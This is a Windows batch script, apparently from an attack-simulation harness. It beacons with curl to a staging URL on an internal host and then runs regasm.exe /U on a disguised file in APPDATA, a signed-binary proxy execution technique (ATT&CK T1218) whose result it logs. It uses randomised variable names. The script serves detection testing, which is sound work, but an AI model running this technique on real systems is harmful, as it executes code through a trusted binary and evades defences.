@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

SET xqwgy=%APPDATA%\9389\f6815b91
SET bzplv=https://10.0.0.49
SET qzxvr=https://10.0.0.49/stage/2/icon.png?9389-7
SET wrpje=ITZEL-S2B
SET xjdty=7
SET pjvce=msedges.txt
SET sbmdr=9389

SET lgfl=!APPDATA!\!xjdty!\macula-simulations.log

echo [!DATE! !TIME!][DEBUG][!wrpje!]: heartbeat=starting>> "!lgfl!" 2>nul
curl -k -s -o nul "!qzxvr!"
echo [!DATE! !TIME!][DEBUG][!wrpje!]: heartbeat=complete>> "!lgfl!" 2>nul

echo [!DATE! !TIME!][DEBUG][!wrpje!]: chdir=starting>> "!lgfl!" 2>nul
cd /d "!xqwgy!"
echo [!DATE! !TIME!][DEBUG][!wrpje!]: chdir=!ERRORLEVEL!>> "!lgfl!" 2>nul

SET ttpresult=1
SET errdetail=
echo [!DATE! !TIME!][DEBUG][!wrpje!]: regasm_exec=starting>> "!lgfl!" 2>nul
%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U "!pjvce!"
IF NOT !ERRORLEVEL! EQU 0 (
    SET ttpresult=0
    SET errdetail=regasm_failed_!ERRORLEVEL!
)
echo [!DATE! !TIME!][DEBUG][!wrpje!]: regasm_exec=!ERRORLEVEL!>> "!lgfl!" 2>nul

SET tsdate=!DATE:~-4!-!DATE:~3,2!-!DATE:~0,2!
SET tstime=!TIME: =0!
SET tstime=!tstime:~0,2!:!tstime:~3,2!:!tstime:~6,2!.!tstime:~9,2!0
echo [!tsdate! !tstime!][!wrpje!]: !xjdty!-!sbmdr!-T1218|Signed Binary Proxy Execution: Regsvcs/Regasm=!ttpresult!:!errdetail!>> "!lgfl!" 2>nul

ENDLOCAL
exit /b 0